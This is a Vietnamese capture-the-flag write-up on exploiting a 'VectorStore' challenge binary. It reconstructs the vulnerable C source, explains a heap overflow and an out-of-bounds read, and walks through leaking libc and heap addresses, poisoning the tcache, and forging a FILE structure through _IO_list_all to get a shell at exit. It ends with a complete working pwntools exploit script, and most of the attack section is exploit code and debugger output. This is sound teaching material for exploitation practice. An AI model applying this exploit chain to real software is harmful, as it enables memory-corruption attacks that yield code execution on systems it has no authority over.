**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 16/8/2026

## 1. Mục tiêu
Bài này code nó hơi khó đọc nên mình đã nhờ bé chat gpt Plus của mình phiên dịch ra thành code dễ đọc hơn tí

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <signal.h>

#define MAX_VECTORS     16
#define MAX_DIMENSIONS  65536
#define MAX_QUERY_COUNT 256

typedef struct {
    uint32_t dimensions;     // +0x00
    uint32_t padding;        // +0x04
    float *data;             // +0x08
    char name[32];           // +0x10
    uint32_t active;         // +0x30
    uint32_t padding2;       // +0x34
} Vector;

/*
 * sizeof(Vector) == 56 (0x38)
 *
 * Layout inferred from:
 *   unk_4040E0 + 56 * id
 */
static Vector vectors[MAX_VECTORS];


/* ------------------------- UPLOAD ------------------------- */

static void handle_upload(void)
{
    unsigned int id;
    unsigned int dimensions;
    unsigned int format;
    unsigned int byte_count;

    char name[32];
    float *data;

    printf("ID: ");
    fflush(stdout);

    if (scanf("%u", &id) != 1)
        return;

    if (id >= MAX_VECTORS) {
        puts("[-] Invalid ID");
        return;
    }

    if (vectors[id].active) {
        puts("[-] Slot occupied");
        return;
    }

    printf("Dimensions: ");
    fflush(stdout);

    if (scanf("%u", &dimensions) != 1)
        return;

    /*
     * Original:
     *
     *     if (dimensions - 1 > 0xFFFF)
     *
     * Since dimensions is unsigned, this accepts:
     *
     *     1 <= dimensions <= 65536
     */
    if (dimensions == 0 || dimensions > MAX_DIMENSIONS) {
        puts("[-] Invalid dimensions");
        return;
    }

    printf("Name: ");
    fflush(stdout);

    /*
     * Consume newline left by scanf().
     */
    getc(stdin);

    size_t pos = 0;

    while (pos < sizeof(name) - 1) {
        int c = getc(stdin);

        if (c == EOF || c == '\n')
            break;

        name[pos++] = (char)c;
    }

    name[pos] = '\0';

    printf("Data format (0=text, 1=binary): ");
    fflush(stdout);

    if (scanf("%u", &format) != 1)
        return;

    data = malloc(4ULL * dimensions);

    if (data == NULL) {
        puts("[-] Allocation failed");
        return;
    }

    if (format == 1) {
        /*
         * Binary input mode
         */
        printf("Byte count: ");
        fflush(stdout);

        if (scanf("%u", &byte_count) != 1) {
            free(data);
            return;
        }

        getc(stdin);

        size_t received = 0;

        while (received < byte_count) {
            ssize_t n = read(
                STDIN_FILENO,
                (char *)data + received,
                byte_count - received
            );

            if (n <= 0)
                break;

            received += (size_t)n;
        }
    } else {
        /*
         * Text / float input mode
         */
        printf("Data (%u floats): ", dimensions);
        fflush(stdout);

        for (unsigned int i = 0; i < dimensions; i++) {
            if (scanf("%f", &data[i]) != 1) {
                /*
                 * Original code writes integer zero into
                 * the float's storage.
                 */
                ((uint32_t *)data)[i] = 0;
            }
        }
    }

    /*
     * Commit vector into global table.
     */
    vectors[id].data = data;
    vectors[id].dimensions = dimensions;

    strncpy(vectors[id].name, name, 31);
    vectors[id].name[31] = '\0';

    vectors[id].active = 1;

    printf(
        "[+] Stored vector '%s' (%u dims)\n",
        vectors[id].name,
        dimensions
    );
}


/* -------------------------- QUERY -------------------------- */

static void handle_query(void)
{
    unsigned int id;
    unsigned int offset;
    unsigned int count;

    printf("ID: ");
    fflush(stdout);

    if (scanf("%u", &id) != 1)
        return;

    if (id >= MAX_VECTORS || !vectors[id].active) {
        puts("[-] Invalid or empty slot");
        return;
    }

    printf("Offset: ");
    fflush(stdout);

    if (scanf("%u", &offset) != 1)
        return;

    printf("Count: ");
    fflush(stdout);

    if (scanf("%u", &count) != 1)
        return;

    if (count > MAX_QUERY_COUNT) {
        puts("[-] Count too large");
        return;
    }

    printf(
        "[*] Vector '%s' [%u..%u]:\n",
        vectors[id].name,
        offset,
        offset + count - 1
    );

    for (unsigned int i = 0; i < count; i++) {
        unsigned int index = offset + i;

        /*
         * IMPORTANT:
         *
         * This intentionally does NOT do:
         *
         *     float value = vectors[id].data[index];
         *
         * The original binary loads 8 bytes starting from:
         *
         *     data + index * 4
         *
         * even though each element is only 4 bytes.
         *
         * Decompiled form:
         *
         * v13 = *(uint64_t *)(
         *      vectors[id].data + 4 * index
         * );
         */
        uint64_t raw;

        memcpy(
            &raw,
            (char *)vectors[id].data + 4ULL * index,
            sizeof(raw)
        );

        /*
         * Low 32 bits interpreted as float.
         */
        uint32_t float_bits = (uint32_t)raw;
        float value;

        memcpy(&value, &float_bits, sizeof(value));

        printf(
            "  [%u] %f (raw: 0x%016lx)\n",
            index,
            value,
            (unsigned long)raw
        );
    }
}


/* ------------------------- DELETE ------------------------- */

static void handle_delete(void)
{
    unsigned int id;

    printf("ID: ");
    fflush(stdout);

    if (scanf("%u", &id) != 1)
        return;

    if (id >= MAX_VECTORS || !vectors[id].active) {
        puts("[-] Invalid or empty slot");
        return;
    }

    free(vectors[id].data);

    vectors[id].data = NULL;
    vectors[id].dimensions = 0;
    vectors[id].active = 0;

    /*
     * Original prints the name BEFORE clearing it.
     */
    printf(
        "[+] Deleted vector '%s'\n",
        vectors[id].name
    );

    /*
     * Original clears 32 bytes starting at name.
     */
    memset(vectors[id].name, 0, sizeof(vectors[id].name));
}


/* -------------------------- SEARCH -------------------------- */

static void handle_search(char *text)
{
    size_t len = strlen(text);

    printf(
        "[*] Searching embeddings for: '%s' (len=%zu)\n",
        text,
        len
    );

    puts("[*] No matches found.");
}


/* --------------------------- INFO --------------------------- */

static void handle_info(void)
{
    unsigned int active = 0;

    puts("[*] VectorStore Server Info:");
    puts("    Version: 0.3.1-dev");
    puts("    Backend: Custom HNSW index");
    puts("    Max vectors: 16");

    /*
     * This string is hardcoded in the binary, despite
     * UPLOAD actually limiting dimensions to 65536.
     */
    puts("    Max dimensions: 4294967295");

    printf("    Active vectors: ");

    for (unsigned int i = 0; i < MAX_VECTORS; i++) {
        if (vectors[i].active)
            active++;
    }

    printf("%u\n", active);
}


/* --------------------------- MAIN --------------------------- */

int main(int argc, char **argv, char **envp)
{
    /*
     * IDA shows:
     *
     *     char s[7];
     *     char v32[17];
     *
     * followed by a huge region before the stack canary.
     *
     * But fgets(s, 4096, stdin) strongly indicates this is
     * really one command buffer.
     *
     * v32 == s + 7, which explains SEARCH:
     *
     *     "SEARCH " = exactly 7 bytes
     */
    char command[4096];

    (void)argc;
    (void)argv;
    (void)envp;

    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    signal(SIGALRM, SIG_DFL);
    alarm(120);

    puts("=== VectorStore v0.3.1 (AI Embedding Server) ===");
    puts("Commands:");
    puts("  UPLOAD   - Store embedding vector");
    puts("  QUERY    - Read vector components");
    puts("  DELETE   - Remove vector");
    puts("  SEARCH <text> - Similarity search");
    puts("  INFO     - Server info");
    puts("  EXIT     - Disconnect");

    while (1) {
        printf("> ");
        fflush(stdout);

        if (fgets(command, sizeof(command), stdin) == NULL)
            return 0;

        command[strcspn(command, "\n")] = '\0';

        if (strncasecmp(command, "UPLOAD", 6) == 0) {
            handle_upload();
        }

        else if (strncasecmp(command, "QUERY", 5) == 0) {
            handle_query();
        }

        else if (strncasecmp(command, "DELETE", 6) == 0) {
            handle_delete();
        }

        else if (strncasecmp(command, "SEARCH ", 7) == 0) {
            /*
             * command + 7 points to text immediately after:
             *
             *     "SEARCH "
             */
            handle_search(command + 7);
        }

        else if (strncasecmp(command, "INFO", 4) == 0) {
            handle_info();
        }

        else if (strncasecmp(command, "EXIT", 4) == 0) {
            puts("[*] Goodbye.");
            return 0;
        }

        else {
            puts("[-] Unknown command");
        }
    }
}
```

Thì ở đây chúng ta có 2 lỗi chính, 1 là **Heap Overflow** và 2 là leak.

**Heap Overflow** ở chỗ khi chúng ta `UPLOAD`, độ lớn của chunk được tính bằng cách `dimensions * 4`, nhưng mà `byte_count` lại không kiểm tra độ lớn chunk mà cho phép chúng ta điền độ lớn tùy thích vào. Từ đó gây ra lỗi **Heap Overflow**.

Lỗi tiếp theo là leak, cái này không hẳn là lỗi mà nó là 1 tính năng. Khi chúng ta sử dụng `QUERY`, nó sẽ bắt đầu viết ra từ vị trí `offset` với số lần `count` cũng là chúng ta tự nhập. Mỗi lần viết nó sẽ tăng lên 4 byte. Nói hơi khó hiểu nhưng chạy tay thử là các bạn hiểu ngay.

OK, giờ luồng thực thi của chúng ta sẽ là leak libc -> leak heap -> sửa lại con trỏ fd của `tcache` và sửa `_IO_list_all` thành fake chunk và `call exit`.

## 2. Cách thực thi
Đầu tiên là mình sẽ khởi tạo 3 chunk với độ lớn lần lượt là 1, 300, 1. Chunk đầu là để leak libc của chunk 300, còn chunk cuối để làm rào chắn tránh khi `free` nó gộp chung với `Top chunk`.

```Python
create(0, 1, b'AAAA')
create(1, 300, b'AAAA')
create(2, 1, b'BBBB')
delete(1)

p.sendlineafter(b'> ', b'QUERY')
p.sendlineafter(b'ID: ', b'0')
p.sendlineafter(b'Offset: ', b'0')
p.sendlineafter(b'Count: ', b'9')
p.recvuntil(b'[8]')
p.recvuntil(b'raw: ')

leak_libc = leak_libc = int(p.recv(18), 16)
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - 0x21ace0
log.success(f'Libc base : {hex(libc.address)}')
```

<img width="707" height="117" alt="image" src="https://github.com/user-attachments/assets/ac937b85-b20a-42e4-937d-3b0d30ec4778" />

<img width="661" height="437" alt="image" src="https://github.com/user-attachments/assets/fb5397be-85b9-4951-a343-b1d4c7dd1e33" />

Ok mình chụp demo cho các bạn thấy thằng `QUERY` hoạt động ra sao. Sau khi có libc base thì ta sẽ leak heap.

```Python
create(1, 300, b'AAAA')
create(3, 1, b'CCCC')
create(4, 10, b'DDDD')
create(5, 10, b'EEEE')
create(6, 10, b'FFFF')

delete(6)
delete(4)
p.sendlineafter(b'> ', b'QUERY')
p.sendlineafter(b'ID: ', b'5')
p.sendlineafter(b'Offset: ', b'0')
p.sendlineafter(b'Count: ', b'20')
p.recvuntil(b'[12]')
p.recvuntil(b'raw: ')

leak_heap = int(p.recv(18), 16)
heap = leak_heap << 12
log.success(f'Heap base : {hex(heap)}')
```

Có Heap rồi thì mình sẽ sử dụng công thức XOR để mã hóa con trỏ bỏ vào tcache để không bị văng

```Python
delete(3)
io_list_all = libc.symbols['_IO_list_all']
target = io_list_all ^ ( heap >> 12 )

payload = b'A' * 24
payload += p64(0x31)
payload += p64(target)
create(3, 1, payload)

create(4, 10, b'DDDD')

payload = p64(heap + 0x2c0)
create(6, 10, p64(heap + 0x850))
```

Ý tưởng thực thi của mình như sau : Đầu tiên là mình sẽ tạo 3 chunk với độ lớn 10, sau đó mình sẽ free 4 và 6 để rơi vào tcache. Lúc này mình sẽ sử dụng note 3 để leak heap của note 4. Rồi mình sẽ free note 3 nhằm mục đích khi mình tạo lại note 3 thì nó sẽ rút đúng tại vị trí đó. Mà như mình nói thì chúng ta có lỗi **Heap Overflow** nên mình sẽ sửa con trỏ fd của note 4 thành `_IO_list_all`.

<img width="731" height="398" alt="image" src="https://github.com/user-attachments/assets/8d5009d3-23db-4bec-81fa-72178e7f3bac" />

Ok sau khi sửa xong `_IO_list_all` thành địa chỉ fake chunk thì mình sẽ bắt đầu viết payload nha kênh chat.

```Python
fake_struct_addr = heap + 0x850
io_wfile_jumps = libc.sym['_IO_wfile_jumps']
system = libc.sym['system']

payload = bytearray(b'\x00' * 0x100)
payload[0:8] = b'  /bin/sh'                                 
payload[0x18:0x20] = p64(0)                                 
payload[0x20:0x28] = p64(1)                                 
payload[0x68:0x70] = p64(system)                            
payload[0x88:0x90] = p64(fake_struct_addr + 0x50)           
payload[0xa0:0xa8] = p64(fake_struct_addr)                  
payload[0xc0:0xc8] = p64(1)                
payload[0xd8:0xe0] = p64(io_wfile_jumps)                 
payload[0xe0:0xe8] = p64(fake_struct_addr)
```

Để mình đặt breakpoint để xem luồng thực thi nó như nào khi chúng ta `exit`.

Đầu tiên là gọi `_IO_flush_all_lockp`

<img width="650" height="281" alt="image" src="https://github.com/user-attachments/assets/d3b425b0-900b-4fc4-9af7-e1622f0aa639" />

<img width="841" height="810" alt="image" src="https://github.com/user-attachments/assets/2aad6d71-926a-4424-9741-7072d212fc81" />

Đây là `_IO_list_all` của chúng ta. Đúng với những gì ta mong đợi, giờ hãy xem nó có gọi `_IO_OVERFLOW` không.

<img width="631" height="293" alt="image" src="https://github.com/user-attachments/assets/011f7ebb-4bac-46fb-a670-9c8c3da05934" />

Ok như ta đã phân tích thì khi gọi `_IO_OVERFLOW`, nó sẽ gọi `_IO_wfile_overflow`.

Cuối cùng là `_IO_wdoallocbuf`.

<img width="487" height="678" alt="image" src="https://github.com/user-attachments/assets/2bef1157-2c51-454e-b24e-489ed9de4312" />

Lúc này rdi đang là `sh;`, nó sẽ thực thi `(*(struct _IO_jump_t *) fp->_wide_data->_wide_vtable)->doallocate (fp)` aka `system(sh;)`

<img width="1118" height="280" alt="image" src="https://github.com/user-attachments/assets/587dd8f2-60f3-452d-8a9f-c589b0e99d4d" />

Thế là xong, chúng ta đã get shell quá đơn giản với Nhân Sigma 🐧.

<img width="447" height="447" alt="image" src="https://github.com/user-attachments/assets/ea016134-53f1-4cbc-9099-d26fb6ba5ae6" />

## 3. Exploit
```Python
from pwn import *

exe = ELF("vectorstore_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process('./vectorstore_patched')

def create(idx, size, payload):
    p.sendlineafter(b'> ', b'UPLOAD')
    p.sendlineafter(b'ID: ', str(idx).encode())
    p.sendlineafter(b'Dimensions: ', str(size).encode())
    p.sendlineafter(b'Name: ', b'Dummy')
    p.sendlineafter(b'Data format (0=text, 1=binary): ', b'1')
    p.sendlineafter(b'Byte count: ', str(len(payload)).encode())
    p.send(payload)

def delete(idx):
    p.sendlineafter(b'> ', b'DELETE')
    p.sendlineafter(b'ID: ', str(idx).encode())

create(0, 1, b'AAAA')
create(1, 300, b'AAAA')
create(2, 1, b'BBBB')
delete(1)

p.sendlineafter(b'> ', b'QUERY')
p.sendlineafter(b'ID: ', b'0')
p.sendlineafter(b'Offset: ', b'0')
p.sendlineafter(b'Count: ', b'9')
p.recvuntil(b'[8]')
p.recvuntil(b'raw: ')

leak_libc = leak_libc = int(p.recv(18), 16)
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - 0x21ace0
log.success(f'Libc base : {hex(libc.address)}')

create(1, 300, b'AAAA')
create(3, 1, b'CCCC')
create(4, 10, b'DDDD')
create(5, 10, b'EEEE')
create(6, 10, b'FFFF')

delete(6)
delete(4)
p.sendlineafter(b'> ', b'QUERY')
p.sendlineafter(b'ID: ', b'5')
p.sendlineafter(b'Offset: ', b'0')
p.sendlineafter(b'Count: ', b'20')
p.recvuntil(b'[12]')
p.recvuntil(b'raw: ')

leak_heap = int(p.recv(18), 16)
heap = leak_heap << 12
log.success(f'Heap base : {hex(heap)}')

delete(3)
io_list_all = libc.symbols['_IO_list_all']
target = io_list_all ^ ( heap >> 12 )

payload = b'A' * 24
payload += p64(0x31)
payload += p64(target)
create(3, 1, payload)

create(4, 10, b'DDDD')

payload = p64(heap + 0x2c0)
create(6, 10, p64(heap + 0x850))

fake_struct_addr = heap + 0x850
io_wfile_jumps = libc.sym['_IO_wfile_jumps']
system = libc.sym['system']

payload = bytearray(b'\x00' * 0x100)
payload[0:8] = b'  /bin/sh'                                 
payload[0x18:0x20] = p64(0)                                 
payload[0x20:0x28] = p64(1)                                 
payload[0x68:0x70] = p64(system)                            
payload[0x88:0x90] = p64(fake_struct_addr + 0x50)           
payload[0xa0:0xa8] = p64(fake_struct_addr)                  
payload[0xc0:0xc8] = p64(1)                
payload[0xd8:0xe0] = p64(io_wfile_jumps)                 
payload[0xe0:0xe8] = p64(fake_struct_addr)

create(7, 300, payload)

p.sendlineafter(b'> ', b'EXIT')

p.interactive()
```
